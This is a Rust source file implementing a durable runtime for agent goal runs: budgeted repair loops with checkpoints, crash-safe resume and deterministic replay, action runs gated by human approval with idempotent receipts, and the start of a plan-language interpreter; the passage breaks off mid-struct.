//! The durable goal runtime.
//!
//! This is the layer that turns the deterministic repair loop into something a
//! long-horizon agent can lean on: a run that is *budgeted*, *authority-scoped*,
//! *checkpointed*, *resumable*, and *replayable*. It reuses the exact same repair
//! leaves as `tach fix` — collect the diagnostics, pick the next one, build its
//! typed patch, verify it through the pipeline — but wraps each step in an event,
//! a checkpoint, and a policy gate derived from the goal's `allow` block.
//!
//! The single most important property: **resume never duplicates work.** A
//! checkpoint captures the post-step workspace, so picking up from it continues
//! with only the diagnostics that remain. A run can crash after any step and
//! resume to exactly where it left off.

use crate::action::{self, ActionPlan};
use crate::agent::{self, Strategy};
use crate::ast::{PlanBlock, PlanCall, PlanStmt, PlanValue};
use crate::event::{kind, EventLog};
use crate::goal::GoalSpec;
use crate::patch::{verify_patch, VerifyOpts, Workspace};
use crate::plan::{self, Env};
use crate::store::{self, events_path, Approval, Checkpoint, GoalRecord, Receipt, RunState};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::io;
use std::path::Path;

/// The result of driving (or partially driving) a run.
pub struct RunResult {
    pub state: RunState,
    pub final_files: BTreeMap<String, String>,
    /// True when the run stopped on a simulated crash (`--crash-after`) rather
    /// than reaching a terminal status. The durable state is fully persisted; the
    /// run is resumable.
    pub crashed: bool,
    /// True when an action run stopped at an approval gate. Not a crash and not a
    /// terminal status — the run is healthy and waiting for `tach goal approve`.
    pub paused: bool,
}

/// Where to inject a simulated crash in an action run. `Step(n)` crashes right after
/// the durable transition that brings `state.step` to `n` (this is what the CLI's
/// `--crash-after step:N` maps to). `AfterReceipt(n)` is a test-only hook that crashes
/// in the *intra-action danger window* — after the `n`th receipt is written but before
/// the cursor advances — to prove resume reuses the receipt instead of re-invoking.
#[derive(Clone, Copy, Debug)]
pub enum ActionCrash {
    Step(u64),
    AfterReceipt(u64),
}

/// Map a stored strategy label back to its `Strategy`.
pub fn strategy_from_label(label: &str) -> Strategy {
    match label {
        "convert" => Strategy::Convert,
        "strict" => Strategy::Strict,
        _ => Strategy::Minimal,
    }
}

/// The outcome of evaluating one step against the current workspace. This is the
/// shared core both the durable driver and the pure replay simulator consume, so
/// the two can never diverge in *what* they decide — only in whether they persist.
enum StepOutcome {
    /// Success: no errors remain and the goal's success conditions hold.
    Done { passed: usize, failed: usize },
    /// No actionable diagnostic — deterministic repair is out of moves.
    NoAction {
        errors: usize,
        passed: usize,
        failed: usize,
    },
    /// A patch was proposed and verified (accepted or not). Boxed because it is by
    /// far the largest variant and dwarfs the two terminal ones.
    Patch(Box<StepPatch>),
}

/// The detail of a proposed-and-verified step.
struct StepPatch {
    accepted: bool,
    new_ws: Workspace,
    diag: agent::DiagSummary,
    patch: agent::PatchSummary,
    verdict: agent::VerdictSummary,
    new_effects: Vec<String>,
    rejections: Vec<String>,
    regressed: bool,
    tests_run: usize,
    diff_chars: usize,
}

/// Evaluate exactly one repair step under a goal's authority. Pure — it reads the
/// workspace and returns a decision, touching neither disk nor the event log.
fn step_once(ws: &Workspace, spec: &GoalSpec, strategy: Strategy) -> StepOutcome {
    let (errors, warnings, report) = agent::collect_problems(ws);
    let require_tests = spec.requires_tests_pass();
    let success = errors.is_empty() && (!require_tests || report.all_green());
    if success {
        return StepOutcome::Done {
            passed: report.passed,
            failed: report.failed,
        };
    }
    let diag = match agent::pick_candidate(&errors, &warnings, strategy) {
        Some(d) => d,
        None => {
            return StepOutcome::NoAction {
                errors: errors.len(),
                passed: report.passed,
                failed: report.failed,
            }
        }
    };
    let patch = agent::build_patch(diag, strategy, ws);
    let opts = VerifyOpts {
        allow_new_effects: false,
        forbid_api_break: false,
        allowed_effects: Some(spec.allowed_effects()),
        allowed_writes: spec.allowed_writes(),
    };
    let verdict = verify_patch(ws, &patch, &opts);
    let regressed = verdict.rejections.iter().any(|r| r.contains("regressed"));
    let diff_chars = patch.edits.iter().map(|e| e.replacement.len()).sum();
    StepOutcome::Patch(Box::new(StepPatch {
        accepted: verdict.accepted,
        new_ws: if verdict.accepted {
            verdict.workspace.clone()
        } else {
            ws.clone()
        },
        diag: agent::diag_summary(diag, ws),
        patch: agent::patch_summary(&patch),
        verdict: agent::verdict_summary(&verdict),
        new_effects: verdict.new_effects.clone(),
        rejections: verdict.rejections.clone(),
        regressed,
        tests_run: verdict.tests_run(),
        diff_chars,
    }))
}

/// Start a brand-new run: persist the goal record, open a fresh event log, and
/// drive to a terminal status (or a simulated crash).
pub fn start_run(
    repo: &Path,
    spec: GoalSpec,
    base: Workspace,
    strategy: Strategy,
    crash_after: Option<u64>,
) -> io::Result<RunResult> {
    // A fingerprint identifies the *goal over this source*; a run id identifies
    // *this run instance*. Allocating from the fingerprint guarantees a fresh run
    // never collides with — or overwrites — a previous run's durable history.
    let fingerprint = store::fingerprint(&spec.name, &base.files);
    let run_id = store::allocate_run(repo, &fingerprint)?;
    let record = GoalRecord {
        spec: spec.clone(),
        strategy: strategy.label().to_string(),
        base_files: base.files.clone(),
        kind: "repair".into(),
    };
    store::save_goal(repo, &run_id, &record)?;

    let mut log = EventLog::create(&events_path(repo, &run_id), &run_id)?;
    log.append(
        kind::RUN_STARTED,
        json!({
            "goal": spec.name,
            "strategy": strategy.label(),
            "budget": { "steps": spec.step_budget(), "retries": spec.retry_budget() },
        }),
    )?;
    log.append(
        kind::WORKSPACE_LOADED,
        json!({ "files": base.files.keys().collect::<Vec<_>>() }),
    )?;

    let state = RunState {
        run_id: run_id.clone(),
        goal: spec.name.clone(),
        status: "running".into(),
        step: 0,
        consecutive_rejections: 0,
        patches_applied: 0,
        patches_rejected: 0,
        tests_run: 0,
        regressions: 0,
        diff_chars: 0,
        final_errors: 0,
        tests_passed: 0,
        tests_failed: 0,
        kind: "repair".into(),
        cursor: 0,
        pending_approval: None,
        actions_executed: 0,
        receipts_created: 0,
        ..Default::default()
    };
    store::save_state(repo, &state)?;

    drive(repo, &spec, strategy, base, state, &mut log, crash_after)
}

/// Resume a previously-crashed (or merely incomplete) run from its last
/// checkpoint, continuing the same event log.
pub fn resume_run(repo: &Path, run_id: &str, crash_after: Option<u64>) -> io::Result<RunResult> {
    let record = store::load_goal(repo, run_id)?;
    if record.kind == "coding" {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "a coding run continues via `tach guard verify`, not `tach goal resume`",
        ));
    }
    if record.kind == "action" {
        // The CLI only exposes step-boundary crashes; the receipt-window hook is test-only.
        return resume_action_run(repo, run_id, crash_after.map(ActionCrash::Step));
    }
    if record.kind == "plan" {
        return resume_plan_run(repo, run_id, crash_after.map(ActionCrash::Step));
    }
    let spec = record.spec;
    let strategy = strategy_from_label(&record.strategy);
    let mut state = store::load_state(repo, run_id)?;

    let mut ws = Workspace::new();
    match store::load_latest_checkpoint(repo, run_id) {
        Ok(cp) => {
            for (k, v) in &cp.files {
                ws.insert(k.clone(), v.clone());
            }
        }
        Err(_) => {
            for (k, v) in &record.base_files {
                ws.insert(k.clone(), v.clone());
            }
        }
    }

    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(kind::RUN_RESUMED, json!({ "from_step": state.step }))?;
    state.status = "running".into();
    drive(repo, &spec, strategy, ws, state, &mut log, crash_after)
}

/// The durable loop. Each iteration: enforce the step budget, evaluate one step,
/// emit its events, checkpoint, and persist state. A `crash_after` returns early
/// without finalizing — leaving a resumable run behind.
fn drive(
    repo: &Path,
    spec: &GoalSpec,
    strategy: Strategy,
    mut ws: Workspace,
    mut state: RunState,
    log: &mut EventLog,
    crash_after: Option<u64>,
) -> io::Result<RunResult> {
    let run_id = state.run_id.clone();
    let step_budget = spec.step_budget();
    let retry_budget = spec.retry_budget();

    loop {
        // Budget gate first: a run that has spent its steps without succeeding is
        // exhausted, full stop.
        if state.step >= step_budget {
            let (errors, _w, report) = agent::collect_problems(&ws);
            state.status = "budget_exhausted".into();
            state.final_errors = errors.len();
            state.tests_passed = report.passed;
            state.tests_failed = report.failed;
            log.append(
                kind::BUDGET_EXHAUSTED,
                json!({ "steps": state.step, "limit": step_budget }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(RunResult {
                state,
                final_files: ws.files,
                crashed: false,
                paused: false,
            });
        }

        match step_once(&ws, spec, strategy) {
            StepOutcome::Done { passed, failed } => {
                state.status = "completed".into();
                state.final_errors = 0;
                state.tests_passed = passed;
                state.tests_failed = failed;
                log.append(
                    kind::RUN_COMPLETED,
                    json!({ "steps": state.step, "patches_applied": state.patches_applied, "tests_passed": passed }),
                )?;
                store::save_state(repo, &state)?;
                return Ok(RunResult {
                    state,
                    final_files: ws.files,
                    crashed: false,
                    paused: false,
                });
            }
            StepOutcome::NoAction {
                errors,
                passed,
                failed,
            } => {
                state.status = "failed".into();
                state.final_errors = errors;
                state.tests_passed = passed;
                state.tests_failed = failed;
                log.append(
                    kind::RUN_FAILED,
                    json!({ "reason": "no actionable diagnostic — needs a model-backed coder", "errors": errors }),
                )?;
                store::save_state(repo, &state)?;
                return Ok(RunResult {
                    state,
                    final_files: ws.files,
                    crashed: false,
                    paused: false,
                });
            }
            StepOutcome::Patch(p) => {
                let StepPatch {
                    accepted,
                    new_ws,
                    diag,
                    patch,
                    verdict,
                    new_effects,
                    rejections,
                    regressed,
                    tests_run,
                    diff_chars,
                } = *p;
                let next_step = state.step + 1;
                state.tests_run += tests_run;
                if regressed {
                    state.regressions += 1;
                }
                log.append(
                    kind::DIAGNOSTIC_EMITTED,
                    serde_json::to_value(&diag).unwrap_or_default(),
                )?;
                log.append(
                    kind::PATCH_PROPOSED,
                    serde_json::to_value(&patch).unwrap_or_default(),
                )?;
                if !new_effects.is_empty() {
                    log.append(
                        kind::EFFECT_DELTA_DETECTED,
                        json!({ "new_effects": new_effects }),
                    )?;
                }

                if accepted {
                    state.patches_applied += 1;
                    state.diff_chars += diff_chars;
                    state.consecutive_rejections = 0;
                    ws = new_ws;
                    log.append(
                        kind::PATCH_VERIFIED,
                        serde_json::to_value(&verdict).unwrap_or_default(),
                    )?;
                    log.append(kind::PATCH_APPLIED, json!({ "patch": patch.name }))?;
                    log.append(
                        kind::TEST_COMPLETED,
                        json!({ "passed": verdict.tests_passed, "failed": verdict.tests_failed }),
                    )?;
                } else {
                    state.patches_rejected += 1;
                    state.consecutive_rejections += 1;
                    log.append(
                        kind::PATCH_REJECTED,
                        json!({ "patch": patch.name, "rejections": rejections }),
                    )?;
                    log.append(
                        kind::TEST_COMPLETED,
                        json!({ "passed": verdict.tests_passed, "failed": verdict.tests_failed }),
                    )?;
                }

                // Advance and checkpoint — this step is now durable.
                state.step = next_step;
                let cp = Checkpoint {
                    step: next_step,
                    status: "running".into(),
                    files: ws.files.clone(),
                    consecutive_rejections: state.consecutive_rejections,
                    patches_applied: state.patches_applied,
                    patches_rejected: state.patches_rejected,
                    tests_run: state.tests_run,
                    regressions: state.regressions,
                    diff_chars: state.diff_chars,
                };
                store::save_checkpoint(repo, &run_id, &cp)?;
                log.append(kind::CHECKPOINT_WRITTEN, json!({ "step": next_step }))?;
                store::save_state(repo, &state)?;

                // Simulated crash: stop here, fully durable, without finalizing.
                if crash_after == Some(next_step) {
                    return Ok(RunResult {
                        state,
                        final_files: ws.files,
                        crashed: true,
                        paused: false,
                    });
                }

                // Out of retries on a stubborn rejection: give up cleanly.
                if !accepted && state.consecutive_rejections > retry_budget {
                    let (errors, _w, report) = agent::collect_problems(&ws);
                    state.status = "failed".into();
                    state.final_errors = errors.len();
                    state.tests_passed = report.passed;
                    state.tests_failed = report.failed;
                    log.append(
                        kind::RUN_FAILED,
                        json!({ "reason": "retry budget exhausted", "rejections": state.patches_rejected }),
                    )?;
                    store::save_state(repo, &state)?;
                    return Ok(RunResult {
                        state,
                        final_files: ws.files,
                        crashed: false,
                        paused: false,
                    });
                }
            }
        }
    }
}

/// Mark a run cancelled. Idempotent; records a `run.cancelled` event.
pub fn cancel_run(repo: &Path, run_id: &str) -> io::Result<RunState> {
    let mut state = store::load_state(repo, run_id)?;
    if state.status == "completed" || state.status == "cancelled" {
        return Ok(state);
    }
    state.status = "cancelled".into();
    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(kind::RUN_CANCELLED, json!({ "at_step": state.step }))?;
    store::save_state(repo, &state)?;
    Ok(state)
}

/// The result of a deterministic replay.
pub struct ReplayResult {
    pub recorded_status: String,
    pub replayed_status: String,
    pub identical: bool,
    pub steps: u64,
}

/// Re-run a recorded goal from its base source, with no persistence and no crash,
/// and prove it reproduces the recorded final state byte-for-byte.
pub fn replay_run(repo: &Path, run_id: &str, rerun: bool) -> io::Result<ReplayResult> {
    let record = store::load_goal(repo, run_id)?;
    if record.kind == "coding" {
        return crate::guard::replay(repo, run_id, rerun);
    }
    if record.kind == "action" {
        return replay_action_run(repo, run_id);
    }
    if record.kind == "plan" {
        return replay_plan_run(repo, run_id);
    }
    let recorded = store::load_state(repo, run_id)?;
    let recorded_files = store::load_latest_checkpoint(repo, run_id)
        .map(|cp| cp.files)
        .unwrap_or_else(|_| record.base_files.clone());

    let spec = record.spec;
    let strategy = strategy_from_label(&record.strategy);
    let mut ws = Workspace::new();
    for (k, v) in &record.base_files {
        ws.insert(k.clone(), v.clone());
    }
    let (status, files, steps) = simulate(&spec, strategy, ws);

    let identical = status == recorded.status && files == recorded_files;
    Ok(ReplayResult {
        recorded_status: recorded.status,
        replayed_status: status,
        identical,
        steps,
    })
}

/// The pure replay loop: the same decisions as `drive`, with no I/O. Returns the
/// terminal status, the final workspace files, and the number of steps taken.
fn simulate(
    spec: &GoalSpec,
    strategy: Strategy,
    mut ws: Workspace,
) -> (String, BTreeMap<String, String>, u64) {
    let step_budget = spec.step_budget();
    let retry_budget = spec.retry_budget();
    let mut step = 0u64;
    let mut consec = 0u64;
    loop {
        if step >= step_budget {
            return ("budget_exhausted".into(), ws.files, step);
        }
        match step_once(&ws, spec, strategy) {
            StepOutcome::Done { .. } => return ("completed".into(), ws.files, step),
            StepOutcome::NoAction { .. } => return ("failed".into(), ws.files, step),
            StepOutcome::Patch(p) => {
                step += 1;
                if p.accepted {
                    ws = p.new_ws;
                    consec = 0;
                } else {
                    consec += 1;
                    if consec > retry_budget {
                        return ("failed".into(), ws.files, step);
                    }
                }
            }
        }
    }
}

// ============================================================================
// Action Layer runtime
// ============================================================================
//
// A business goal runs a fixed `ActionPlan` instead of repairing source. Its own
// driver (`drive_actions`) reuses the same durable substrate — run ids, the append-
// only event log, `state.json` — but its unit of work is "invoke a tool and write a
// receipt", not "verify a typed patch", so it does not share `drive`/`step_once`.
//
// The single correctness invariant: **advancing the cursor and saving state is the
// sole commit that moves past an action / clears an approval gate.** The approval
// file's status and the receipts dir are the durable truth; `RunState.status` is
// cosmetic. Every crash window then resolves safely (see `drive_actions`).

/// A `RunResult` for an action run, which has no workspace to write back.
fn action_result(state: RunState, crashed: bool, paused: bool) -> RunResult {
    RunResult {
        state,
        final_files: BTreeMap::new(),
        crashed,
        paused,
    }
}

/// Start a brand-new action run from a built-in goal's spec + plan.
pub fn start_action_run(
    repo: &Path,
    spec: GoalSpec,
    plan: ActionPlan,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let base: BTreeMap<String, String> = BTreeMap::new();
    let fingerprint = store::fingerprint(&spec.name, &base);
    let run_id = store::allocate_run(repo, &fingerprint)?;
    let record = GoalRecord {
        spec: spec.clone(),
        strategy: "action".into(),
        base_files: base,
        kind: "action".into(),
    };
    store::save_goal(repo, &run_id, &record)?;

    let mut log = EventLog::create(&events_path(repo, &run_id), &run_id)?;
    log.append(
        kind::RUN_STARTED,
        json!({
            "goal": spec.name,
            "kind": "action",
            "budget": { "steps": spec.step_budget() },
            "tools": spec.allow.tools,
            "actions": plan.steps.len(),
        }),
    )?;

    let state = RunState {
        run_id: run_id.clone(),
        goal: spec.name.clone(),
        status: "running".into(),
        step: 0,
        consecutive_rejections: 0,
        patches_applied: 0,
        patches_rejected: 0,
        tests_run: 0,
        regressions: 0,
        diff_chars: 0,
        final_errors: 0,
        tests_passed: 0,
        tests_failed: 0,
        kind: "action".into(),
        cursor: 0,
        pending_approval: None,
        actions_executed: 0,
        receipts_created: 0,
        ..Default::default()
    };
    store::save_state(repo, &state)?;

    drive_actions(repo, &spec, &plan, state, &mut log, crash)
}

/// Resume an action run from `state.json` (its cursor) — there are no checkpoints to
/// load; the cursor + approvals + receipts dirs are the durable state. The plan is
/// re-derived from the catalog by goal name.
pub fn resume_action_run(
    repo: &Path,
    run_id: &str,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let record = store::load_goal(repo, run_id)?;
    let spec = record.spec;
    let (_, plan) = action::builtin_action_goal(&spec.name).ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::NotFound,
            format!("no built-in action goal `{}` to resume", spec.name),
        )
    })?;
    let state = store::load_state(repo, run_id)?;
    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(
        kind::RUN_RESUMED,
        json!({ "from_step": state.step, "cursor": state.cursor }),
    )?;
    // Leave `status` as recorded (`awaiting_approval` or `running`); the driver
    // resolves the gate from the approval file, never from a second status flag.
    drive_actions(repo, &spec, &plan, state, &mut log, crash)
}

/// The durable action loop. See the module comment for the crash-safety invariant.
fn drive_actions(
    repo: &Path,
    spec: &GoalSpec,
    plan: &ActionPlan,
    mut state: RunState,
    log: &mut EventLog,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let run_id = state.run_id.clone();
    let step_budget = spec.step_budget();
    let tools = spec.allowed_tools();

    loop {
        // Budget gate bills the CURSOR (plan progress), not raw iterations — so an
        // approval pause or an idempotent re-entry never burns budget, and a granted
        // gate (cursor already below budget) is never voided on resume.
        if state.cursor >= step_budget {
            state.status = "budget_exhausted".into();
            log.append(
                kind::BUDGET_EXHAUSTED,
                json!({ "actions": state.cursor, "limit": step_budget }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(action_result(state, false, false));
        }

        let idx = state.cursor as usize;
        if idx >= plan.steps.len() {
            state.status = "completed".into();
            log.append(
                kind::RUN_COMPLETED,
                json!({
                    "steps": state.step,
                    "actions_executed": state.actions_executed,
                    "receipts": state.receipts_created,
                }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(action_result(state, false, false));
        }

        let action = &plan.steps[idx];

        // Authority FIRST, every iteration, for read and effectful actions alike: a
        // plan can only ever call what the goal's `allow` block grants. No ambient
        // authority — the check runs even on the post-approval execute path.
        if !tools.contains(&action.tool) {
            state.status = "failed".into();
            log.append(
                kind::RUN_FAILED,
                json!({
                    "reason": format!("tool `{}` is outside the goal's authority", action.tool),
                    "action": action.id,
                }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(action_result(state, false, false));
        }

        // Approval gate — the approval file's status is the durable truth.
        if action.requires_approval {
            let apr_id = store::approval_id(&run_id, &action.id);
            let status = store::load_approval(repo, &run_id, &apr_id)
                .ok()
                .map(|a| a.status);
            match status.as_deref() {
                None => {
                    // First reach: propose + request approval, then PAUSE. The cursor
                    // is NOT advanced — re-entry on resume sees the pending file.
                    let approval = Approval {
                        id: apr_id.clone(),
                        action_id: action.id.clone(),
                        tool: action.tool.clone(),
                        summary: action.summary.clone(),
                        status: "pending".into(),
                        note: None,
                    };
                    store::save_approval(repo, &run_id, &approval)?;
                    log.append(
                        kind::ACTION_PROPOSED,
                        json!({
                            "action": action.id,
                            "tool": action.tool,
                            "summary": action.summary,
                            "input": action.input,
                        }),
                    )?;
                    log.append(
                        kind::APPROVAL_REQUESTED,
                        json!({ "approval_id": apr_id, "action": action.id, "tool": action.tool }),
                    )?;
                    state.pending_approval = Some(apr_id);
                    state.status = "awaiting_approval".into();
                    state.step += 1;
                    store::save_state(repo, &state)?;
                    if matches!(crash, Some(ActionCrash::Step(n)) if n == state.step) {
                        return Ok(action_result(state, true, false));
                    }
                    return Ok(action_result(state, false, true));
                }
                Some("pending") => {
                    state.status = "awaiting_approval".into();
                    store::save_state(repo, &state)?;
                    return Ok(action_result(state, false, true));
                }
                Some("denied") => {
                    log.append(
                        kind::ACTION_SKIPPED,
                        json!({ "action": action.id, "reason": "approval denied" }),
                    )?;
                    state.status = "denied".into();
                    log.append(
                        kind::RUN_FAILED,
                        json!({ "reason": "approval denied", "action": action.id }),
                    )?;
                    store::save_state(repo, &state)?;
                    return Ok(action_result(state, false, false));
                }
                // "granted" (or any other resolved state) → fall through and execute.
                _ => {}
            }
        }

        // Execute. For effectful actions, the receipt is the commit point and the
        // idempotency scan makes re-entry safe.
        if action.effectful {
            let key = store::idempotency_key(&run_id, &action.id, &action.tool, &action.input);
            if let Some(existing) = store::find_receipt_by_key(repo, &run_id, &key)? {
                // Already done in a prior (crashed) pass — never invoke twice.
                log.append(
                    kind::RECEIPT_REUSED,
                    json!({
                        "receipt_id": existing.receipt_id,
                        "idempotency_key": key,
                        "action": action.id,
                    }),
                )?;
                log.append(
                    kind::ACTION_SKIPPED,
                    json!({ "action": action.id, "reason": "receipt already exists" }),
                )?;
            } else {
                log.append(
                    kind::TOOL_CALLED,
                    json!({
                        "tool": action.tool,
                        "action": action.id,
                        "idempotency_key": key,
                        "input": action.input,
                    }),
                )?;
                match action::invoke_fake_tool(&action.tool, &action.input) {
                    Ok(output) => {
                        log.append(
                            kind::TOOL_COMPLETED,
                            json!({ "tool": action.tool, "action": action.id, "output": output }),
                        )?;
                        let rid = store::receipt_id(&key);
                        // tool.called and tool.completed are already appended; the next
                        // event will be receipt.created, so it gets the current seq.
                        let created_event_id = format!("evt_{:06}", log.peek_seq());
                        let receipt = Receipt {
                            receipt_id: rid.clone(),
                            idempotency_key: key.clone(),
                            action_id: action.id.clone(),
                            tool: action.tool.clone(),
                            input: action.input.clone(),
                            output,
                            run_id: run_id.clone(),
                            // `receipts_created` is bumped just after this save.
                            step: (state.receipts_created + 1) as u64,
                            effect: action.tool.clone(),
                            input_hash: store::input_hash(&action.input),
                            approval_id: action
                                .requires_approval
                                .then(|| store::approval_id(&run_id, &action.id)),
                            created_event_id,
                        };
                        store::save_receipt(repo, &run_id, &receipt)?; // <- COMMIT POINT
                        state.receipts_created += 1;
                        log.append(
                            kind::RECEIPT_CREATED,
                            json!({
                                "receipt_id": rid,
                                "tool": action.tool,
                                "action": action.id,
                                "idempotency_key": key,
                            }),
                        )?;
                        // Intra-action danger window (test-only): crash after the
                        // receipt is durable but before the cursor advances. Resume
                        // must reuse this receipt rather than refund twice.
                        if matches!(crash, Some(ActionCrash::AfterReceipt(n)) if n as usize == state.receipts_created)
                        {
                            store::save_state(repo, &state)?;
                            return Ok(action_result(state, true, false));
                        }
                    }
                    Err(e) => {
                        log.append(
                            kind::TOOL_FAILED,
                            json!({ "tool": action.tool, "action": action.id, "error": e }),
                        )?;
                        state.status = "failed".into();
                        log.append(
                            kind::RUN_FAILED,
                            json!({ "reason": "tool failed", "action": action.id }),
                        )?;
                        store::save_state(repo, &state)?;
                        return Ok(action_result(state, false, false));
                    }
                }
            }
            state.actions_executed += 1;
        } else {
            // Read-only action: invoke, record, no receipt.
            log.append(
                kind::TOOL_CALLED,
                json!({ "tool": action.tool, "action": action.id, "input": action.input }),
            )?;
            match action::invoke_fake_tool(&action.tool, &action.input) {
                Ok(output) => {
                    log.append(
                        kind::TOOL_COMPLETED,
                        json!({ "tool": action.tool, "action": action.id, "output": output }),
                    )?;
                }
                Err(e) => {
                    log.append(
                        kind::TOOL_FAILED,
                        json!({ "tool": action.tool, "action": action.id, "error": e }),
                    )?;
                    state.status = "failed".into();
                    log.append(
                        kind::RUN_FAILED,
                        json!({ "reason": "tool failed", "action": action.id }),
                    )?;
                    store::save_state(repo, &state)?;
                    return Ok(action_result(state, false, false));
                }
            }
            state.actions_executed += 1;
        }

        // ADVANCE — the sole atomic commit past this action and any approval gate.
        state.cursor += 1;
        state.pending_approval = None;
        state.status = "running".into();
        state.step += 1;
        store::save_state(repo, &state)?;
        if matches!(crash, Some(ActionCrash::Step(n)) if n == state.step) {
            return Ok(action_result(state, true, false));
        }
    }
}

/// Replay an action run as a pure simulation. Reads the recorded human approvals from
/// the store (they are the run's non-deterministic *inputs*), re-invokes the
/// deterministic fake tools, and writes nothing. Determinism is proven by comparing
/// the simulated terminal status and the simulated receipt set (idempotency key →
/// output) against the recorded ones — **not** the event sequence, which legitimately
/// differs between a straight run and a crashed-then-resumed one.
pub fn replay_action_run(repo: &Path, run_id: &str) -> io::Result<ReplayResult> {
    let record = store::load_goal(repo, run_id)?;
    let spec = record.spec;
    let (_, plan) = action::builtin_action_goal(&spec.name).ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::NotFound,
            format!("no built-in action goal `{}` to replay", spec.name),
        )
    })?;
    let recorded = store::load_state(repo, run_id)?;
    let recorded_receipts: BTreeMap<String, serde_json::Value> = store::list_receipts(repo, run_id)
        .into_iter()
        .map(|r| (r.idempotency_key, r.output))
        .collect();

    let step_budget = spec.step_budget();
    let tools = spec.allowed_tools();
    let mut cursor = 0usize;
    let mut sim_receipts: BTreeMap<String, serde_json::Value> = BTreeMap::new();
    let mut status = "completed".to_string();

    while cursor < plan.steps.len() {
        if cursor as u64 >= step_budget {
            status = "budget_exhausted".into();
            break;
        }
        let action = &plan.steps[cursor];
        if !tools.contains(&action.tool) {
            status = "failed".into();
            break;
        }
        if action.requires_approval {
            let apr_id = store::approval_id(run_id, &action.id);
            match store::load_approval(repo, run_id, &apr_id)
                .ok()
                .map(|a| a.status)
                .as_deref()
            {
                Some("granted") => {}
                Some("denied") => {
                    status = "denied".into();
                    break;
                }
                _ => {
                    status = "awaiting_approval".into();
                    break;
                }
            }
        }
        if action.effectful {
            let key = store::idempotency_key(run_id, &action.id, &action.tool, &action.input);
            if let std::collections::btree_map::Entry::Vacant(slot) = sim_receipts.entry(key) {
                match action::invoke_fake_tool(&action.tool, &action.input) {
                    Ok(out) => {
                        slot.insert(out);
                    }
                    Err(_) => {
                        status = "failed".into();
                        break;
                    }
                }
            }
        } else if action::invoke_fake_tool(&action.tool, &action.input).is_err() {
            status = "failed".into();
            break;
        }
        cursor += 1;
    }

    let identical = status == recorded.status && sim_receipts == recorded_receipts;
    Ok(ReplayResult {
        recorded_status: recorded.status,
        replayed_status: status,
        identical,
        steps: cursor as u64,
    })
}

// ============================================================================
// Plan-language runtime (durable re-execution)
// ============================================================================
//
// A `plan { ... }` goal is driven by RE-EXECUTING the plan from the top on every
// run and every resume. The idea that makes loops and long-horizon flows safe:
// each tool `call` is memoized by its durable receipt. Reaching a call whose
// receipt already exists returns the recorded output WITHOUT invoking the tool
// again; reaching an un-granted `approve` pauses the walk; a crash anywhere is
// recovered by simply walking again. So:
//
//   * the receipt write is the commit point — a side effect happens exactly once
//     even across crashes (and the write is atomic; see `store::write_json`);
//   * the approval file is the durable truth of a gate (the interpreter only
//     reads it — the approve/deny CLI command writes granted/denied);
//   * `state.json` is COSMETIC — control flow is recomputed from the plan + the
//     receipts/ and approvals/ dirs on every walk, never read back from state.
//
// `call_index`/`gate_index` are assigned in WALK ORDER (not at parse time), so a
// loop's repeated `call` gets a distinct idempotency key per iteration, and the
// assignment is stable across resume because the walk up to the frontier is
// deterministic: memoized outputs + recorded approvals + pure fake tools mean
// every branch taken and every loop count is identical on every walk.

/// A generous internal ceiling on loop-body iterations per walk. The user-facing
/// budget bounds tool calls; this exists only so a pathological call-free loop
/// (`while true { let x = 1 }`) fails loudly instead of spinning forever.
const PLAN_LOOP_LIMIT: u64 = 1_000_000;

/// How a plan walk ends, or why a statement halted it. Anything but `Next`
/// unwinds the enclosing blocks/loops up to the top of the walk.
enum Flow {
    /// Continue to the next statement.
    Next,
    /// Hit an un-granted approval gate; the run is paused (healthy, resumable).
    Pause,
    /// Hit a denied approval gate (the id is recorded for the run.failed reason).
    Denied(String),
    /// A plan-language or tool error.
    Failed(String),
    /// The step budget (max tool calls) was exceeded.
    Budget,
    /// A simulated `--crash-after` fired; the durable state is intact, resumable.
    Crash,
}

/// True when a `--crash-after`/test crash should fire after the `committed`-th
/// new receipt of this process. Both crash variants mean the same thing for a
/// plan: stop right after a side effect is durable, before doing anything else.
fn crash_after_n(crash: Option<ActionCrash>, committed: u64) -> bool {
    matches!(crash, Some(ActionCrash::Step(n)) | Some(ActionCrash::AfterReceipt(n)) if n == committed)
}

fn json_type_name(v: &Value) -> &'static str {
    match v {
        Value::Null => "null",
        Value::Bool(_) => "boolean",
        Value::Number(_) => "number",
        Value::String(_) => "string",
        Value::Array(_) => "list",
        Value::Object(_) => "record",
    }
}

/// The first tool a gated body would call, for display in the approval listing.
fn first_call_tool(stmts: &[PlanStmt]) -> Option<&str> {
    for s in stmts {
        let found = match s {
            PlanStmt::Call { call, .. } => Some(call.tool.as_str()),
            PlanStmt::Let {
                value: PlanValue::Call(c),
                ..
            } => Some(c.tool.as_str()),
            PlanStmt::If { then, els, .. } => {
                first_call_tool(then).or_else(|| els.as_deref().and_then(first_call_tool))
            }
            PlanStmt::For { body, .. }
            | PlanStmt::While { body, .. }
            | PlanStmt::Approve { body, .. } => first_call_tool(body),
            PlanStmt::Let { .. } => None,
        };
        if found.is_some() {
            return found;
        }
    }
    None
}

/// The mutable context threaded through one durable plan walk. None of it is the
/// durable truth (that is the receipts/approvals dirs); it is rebuilt from
/// scratch on every walk.
struct PlanCtx<'a> {
    repo: &'a Path,
    run_id: String,
    spec: &'a GoalSpec,
    log: &'a mut EventLog,
    state: RunState,
    env: Env,
    /// Tool calls reached so far this walk — the idempotency discriminator and
    /// what the budget is billed against.
    call_index: u64,
    /// Approval gates reached so far this walk.
    gate_index: u64,
    /// New receipts committed in THIS process — drives the crash hook. Process-
    /// local on purpose: it must never be confused with the cosmetic cumulative
    /// `receipts_created`, which can be stale after a crash between a receipt
    /// write and the following state save.
    committed_this_process: u64,
